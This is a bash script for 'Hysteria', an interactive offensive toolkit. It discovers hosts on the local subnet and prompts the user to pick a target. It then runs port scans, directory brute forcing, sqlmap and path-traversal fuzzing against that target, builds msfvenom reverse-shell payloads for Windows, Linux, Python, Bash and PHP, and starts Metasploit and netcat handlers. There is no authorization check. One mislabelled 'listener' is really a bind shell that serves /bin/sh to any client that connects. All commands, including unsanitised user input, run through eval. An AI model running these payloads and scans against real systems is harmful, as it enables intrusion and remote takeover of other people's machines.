#!/usr/bin/env bash

set -euo pipefail
IFS=$'\n\t'

# Colors
RED="\e[31m"; GREEN="\e[32m"; YELLOW="\e[33m"; BLUE="\e[34m"; MAG="\e[35m"; CYAN="\e[36m"; RESET="\e[0m"

TARGET_IP=""
LISTENER_IP=""
INTERFACE="eth0"
SUBNET=""
show_banner() {
    clear
    echo -e "${CYAN}"
    echo " _    _            _               "
    echo "| |  | |          | |              "
    echo "| |__| | __ _  ___| | _____ _ __   "
    echo "|  __  |/ _\` |/ __| |/ / _ \ '__|  "
    echo "| |  | | (_| | (__|   <  __/ |     "
    echo "|_|  |_|\__,_|\___|_|\_\___|_|     "
    echo -e "${RESET}"
    echo -e "${RED}========================================${RESET}"
    echo -e "${RED}               Hysteria                 ${RESET}"
    echo -e "${RED}========================================${RESET}"
    echo -e "${MAG}                 by Ahmed Adel${RESET}"
    echo -e "${BLUE}           GitHub: https://github.com/Hysteria127${RESET}"

    echo ""
}

pause(){ read -rp "Press Enter to continue..."; }

get_interface_ip() {
    local iface=${1:-$INTERFACE}
    ip addr show "$iface" | grep -Po 'inet \K[\d.]+' | head -1
}

configure_network() {
    show_banner
    echo -e "${BLUE}Network Configuration${RESET}"
    echo "This step detects your network for scanning targets"
    
    if command -v ip >/dev/null 2>&1; then
        LISTENER_IP=$(get_interface_ip "$INTERFACE" 2>/dev/null || echo "127.0.0.1")
        SUBNET="${LISTENER_IP%.*}.0/24"
        echo -e "${GREEN}Detected:$RESET Interface '$INTERFACE' => $LISTENER_IP"
        echo -e "${GREEN}Subnet:$RESET $SUBNET"
    else
        LISTENER_IP="127.0.0.1"
        echo -e "${YELLOW}Network tools not found, using localhost${RESET}"
    fi
    
    echo
    read -rp "Network interface [$INTERFACE]: " input_iface
    INTERFACE=${input_iface:-$INTERFACE}
    
    read -rp "Scan subnet [$SUBNET]: " input_subnet
    SUBNET=${input_subnet:-$SUBNET}
    
    echo -e "${GREEN}Ready to scan: $SUBNET${RESET}"
    pause
}

discover_targets() {
    show_banner
    echo -e "${BLUE}TARGET DISCOVERY${RESET}"
    echo "Scanning network for active hosts..."
    echo "Subnet: $SUBNET"
    echo
    
    if ! command -v netdiscover >/dev/null 2>&1; then
        echo -e "${YELLOW}Installing netdiscover...${RESET}"
        sudo apt update && sudo apt install -y netdiscover
    fi
    
    echo -e "${GREEN}Active hosts:${RESET}"
    sudo netdiscover -r "$SUBNET" -P
    
    echo
    echo -e "${YELLOW}Tips:${RESET}"
    echo "- Look for devices with consistent traffic patterns"
    echo "- Note any interesting hostnames or MAC vendors"
    echo "- Common targets: web servers, SSH services, databases"
    
    echo
    read -rp "Enter target IP: " TARGET_IP
    echo -e "${GREEN}Target set to: $TARGET_IP${RESET}"
    pause
}

confirm_and_run() {
    local cmd="$1"
    local safe_mode=${2:-false}
    
    echo
    echo -e "${MAG}Command:${RESET}"
    echo -e "${BLUE}$cmd${RESET}"
    echo
    
    if [[ "$safe_mode" == true ]]; then
        echo -e "${GREEN}Executing safe command...${RESET}"
        eval "$cmd"
        echo -e "${GREEN}--- Command finished ---${RESET}"
    else
        read -rp "Type 'RUN' (exactly) to execute, or press Enter to skip: " runflag
        if [[ "$runflag" == "RUN" ]]; then
            echo -e "${RED}--- Executing ---${RESET}"
            eval "$cmd"
            echo -e "${GREEN}--- Command finished ---${RESET}"
        else
            echo "Skipped execution."
        fi
    fi
    pause
}

########## Menus ##########

main_menu() {
    while true; do
        show_banner
        echo -e "${GREEN}MAIN MENU${RESET}"
        echo "Target: ${TARGET_IP:-NOT SET} | Listener: ${LISTENER_IP:-NOT SET}"
        echo
        echo "1) Configure Network"
        echo "2) Discover Targets"
        echo "3) Port Scanning"
        echo "4) Web Testing"
        echo "5) Fuzzing"
        echo "6) Payload Generation"
        echo "7) Exploitation"
        echo "0) Exit"
        echo
        read -rp "Choose an option: " opt
        case "$opt" in
            1) configure_network ;;
            2) discover_targets ;;
            3) port_scanning_menu ;;
            4) web_menu ;;
            5) fuzzing_menu ;;
            6) payload_menu ;;
            7) exploitation_menu ;;
            0) echo "Bye."; exit 0 ;;
            *) echo "Invalid"; sleep 1 ;;
        esac
    done
}

### Port Scanning ###
port_scanning_menu() {
    while true; do
        if [[ -z "${TARGET_IP:-}" ]]; then
            echo -e "${RED}Error: No target IP set!${RESET}"
            echo "Please run Target Discovery first."
            pause
            return
        fi
        
        show_banner
        echo -e "${BLUE}PORT SCANNING${RESET}"
        echo "Target: $TARGET_IP"
        echo
        echo "1) TCP SYN scan (-sS)"
        echo "2) TCP Connect scan (-sT)"
        echo "3) UDP scan (-sU)"
        echo "4) Service/version detection (-sV)"
        echo "5) OS detection (-O)"
        echo "6) Aggressive scan (-A)"
        echo "7) Custom port range"
        echo "8) All ports fast scan"
        echo "9) Back"
        read -rp "Choose: " p
        case "$p" in
            1)
                echo "TCP SYN Scan (Stealth)"
                confirm_and_run "nmap -sS -Pn -p 1-1024 $TARGET_IP"
                ;;
            2)
                echo "TCP Connect Scan"
                confirm_and_run "nmap -sT -Pn -p 1-1024 $TARGET_IP"
                ;;
            3)
                echo "UDP Scan"
                confirm_and_run "nmap -sU -Pn -p U:53,67,69,123,161,162 $TARGET_IP"
                ;;
            4)
                echo "Service/Version Detection"
                confirm_and_run "nmap -sV -Pn $TARGET_IP"
                ;;
            5)
                echo "OS Detection"
                confirm_and_run "nmap -O $TARGET_IP"
                ;;
            6)
                echo "Aggressive Scan (All techniques)"
                confirm_and_run "nmap -A -Pn $TARGET_IP"
                ;;
            7)
                read -rp "Enter port range (e.g., 1-1000 or 22,80,443): " ports
                confirm_and_run "nmap -sS -Pn -p $ports $TARGET_IP"
                ;;
            8)
                echo "Fast scan of all 65535 ports"
                confirm_and_run "nmap -p- -T4 -Pn $TARGET_IP"
                ;;
            9) return ;;
            *) echo "Invalid"; sleep 1 ;;
        esac
    done
}

### Web ###
web_menu() {
    while true; do
        if [[ -z "${TARGET_IP:-}" ]]; then
            echo -e "${RED}Error: No target IP set!${RESET}"
            echo "Please run Target Discovery first."
            pause
            return
        fi
        
        show_banner
        echo -e "${BLUE}WEB TESTING${RESET}"
        echo "Target: $TARGET_IP"
        echo "1) Directory brute force (gobuster)"
        echo "2) Web vulnerability scan (nikto)"
        echo "3) SQL injection test (sqlmap)"
        echo "9) Back"
        read -rp "Choose: " w
        case "$w" in
            1)
                confirm_and_run "gobuster dir -u http://$TARGET_IP -w /usr/share/wordlists/dirb/common.txt -t 20"
                ;;
            2)
                confirm_and_run "nikto -h http://$TARGET_IP"
                ;;
            3)
                confirm_and_run "sqlmap --url 'http://$TARGET_IP/page.php?id=1' --batch"
                ;;
            9) return ;;
            *) echo "Invalid"; sleep 1 ;;
        esac
    done
}

### Fuzzing ###
fuzzing_menu() {
    while true; do
        if [[ -z "${TARGET_IP:-}" ]]; then
            echo -e "${RED}Error: No target IP set!${RESET}"
            echo "Please run Target Discovery first."
            pause
            return
        fi
        
        show_banner
        echo -e "${BLUE}FUZZING${RESET}"
        echo "Target: $TARGET_IP"
        echo "1) HTTP fuzzing (ffuf)"
        echo "2) File fuzzing (dotdotpwn)"
        echo "9) Back"
        read -rp "Choose: " f
        case "$f" in
            1)
                confirm_and_run "ffuf -u http://$TARGET_IP/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 40"
                ;;
            2)
                confirm_and_run "dotdotpwn -m http -h $TARGET_IP -M GET"
                ;;
            9) return ;;
            *) echo "Invalid"; sleep 1 ;;
        esac
    done
}

### Payloads ###
payload_menu() {
    while true; do
        show_banner
        echo -e "${BLUE}PAYLOAD GENERATION${RESET}"
        echo "Listener IP: ${LISTENER_IP:-AUTO}"
        echo "1) Windows Meterpreter TCP"
        echo "2) Linux Meterpreter TCP"
        echo "3) Python Reverse Shell"
        echo "4) Bash Reverse Shell"
        echo "5) PHP Reverse Shell"
        echo "9) Back"
        read -rp "Choose: " p
        case "$p" in
            1)
                echo "Windows x86 Meterpreter Reverse TCP"
                confirm_and_run "msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LISTENER_IP LPORT=4444 -f exe -o win_payload.exe"
                ;;
            2)
                echo "Linux x86 Meterpreter Reverse TCP"
                confirm_and_run "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LISTENER_IP LPORT=4444 -f elf -o lin_payload.elf"
                ;;
            3)
                echo "Python Reverse Shell"
                confirm_and_run "msfvenom -p cmd/unix/reverse_python LHOST=$LISTENER_IP LPORT=4444 -f raw -o pyshell.py"
                ;;
            4)
                echo "Bash Reverse Shell"
                confirm_and_run "msfvenom -p cmd/unix/reverse_bash LHOST=$LISTENER_IP LPORT=4444 -f raw -o bashshell.sh"
                ;;
            5)
                echo "PHP Reverse Shell"
                confirm_and_run "msfvenom -p php/meterpreter_reverse_tcp LHOST=$LISTENER_IP LPORT=4444 -f raw -o phpshell.php"
                ;;
            9) return ;;
            *) echo "Invalid"; sleep 1 ;;
        esac
    done
}

### Exploitation ###
exploitation_menu() {
    while true; do
        show_banner
        echo -e "${BLUE}EXPLOITATION${RESET}"
        echo "Listener IP: $LISTENER_IP"
        echo "1) Start Multi/Handler (Windows)"
        echo "2) Start Multi/Handler (Linux)"
        echo "3) Start Python Listener"
        echo "4) Netcat Listener (Port 4444)"
        echo "9) Back"
        read -rp "Choose: " e
        case "$e" in
            1)
                echo "Starting Metasploit Handler for Windows payloads..."
                confirm_and_run "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $LISTENER_IP; set LPORT 4444; run\""
                ;;
            2)
                echo "Starting Metasploit Handler for Linux payloads..."
                confirm_and_run "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST $LISTENER_IP; set LPORT 4444; run\""
                ;;
            3)
                echo "Starting Python Listener..."
                confirm_and_run "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"$LISTENER_IP\",4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
                ;;
            4)
                echo "Starting Netcat Listener..."
                confirm_and_run "nc -nlvp 4444 -s $LISTENER_IP"
                ;;
            9) return ;;
            *) echo "Invalid"; sleep 1 ;;
        esac
    done
}

trap 'echo; echo "Interrupted."; exit 1' INT TERM
configure_network
main_menu
